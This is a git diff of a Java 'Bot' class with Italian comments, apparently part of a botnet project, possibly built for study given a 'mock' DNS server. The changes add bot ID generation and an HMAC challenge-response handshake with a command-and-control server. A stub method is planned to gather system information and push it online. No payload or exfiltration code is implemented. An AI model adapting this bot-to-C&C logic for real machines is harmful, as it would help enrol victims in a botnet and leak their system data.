@@ -39,23 +39,30 @@ public Bot(){}
 public void initializeBot(){
 	
 if(!engineBot.isCommandandconquerStatus()){
-	//Non necessario 
-	//networkService.selectIp();
+	
+	//metter controllo ID se ==NULL genera altrimenti riusa
+	//TODO salvare ID su properties
+	networkService.generateID();
+	//inserire id univoco nella richiesta
 	networkService.firstConnectToMockServerDns();
-		
-//		Long q=(Long.MAX_VALUE/4)*3;
-//		String s="5ffffffffffffffd";
-	//System.out.println(q);
-	//System.out.println(Long.parseLong(s,16));
-	//
-
-	if(challengeToCommandConquer())
-		System.out.println("Bot is Ready");
+	//reinserire id univoco nella richiesta
+	if(challengeToCommandConquer()){
+		//push info online os
+		System.out.println("Bot is Ready");}
 	else
 		System.out.println("Bot not Ready, authentication failed");
 }
 }
 
+
+
+public void getInfo(){
+	
+	//prendi info sistema 
+	
+	//pusha online info
+	
+}
 
 private boolean challengeToCommandConquer(){
 	//
@@ -66,21 +73,12 @@ private boolean challengeToCommandConquer(){
 	
 	if(challenge!=null){
 		
-		//System.out.println("Challenge Positvi");
-		
-		//TODO richiesta di challenge
 		String key=auth.generateStringKey(challenge.getValue2());
-		System.out.println("1");
 		String hashMac=auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-		System.out.println("Rnd Number "+challenge.getValue1());
-		System.out.println("Rnd Iteration Number "+challenge.getValue2());
 		System.out.println(hashMac);
-		System.out.println("2");
 		String response=request.getResponseFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0),challenge.getValue1(), challenge.getValue2(), hashMac);
-		System.out.println("3");
 		System.out.println("La risposta del CeC: "+response);
 		
-		//if()//TODO gestisco la risposta del C&C e genero hmac
 	}
 	
 	
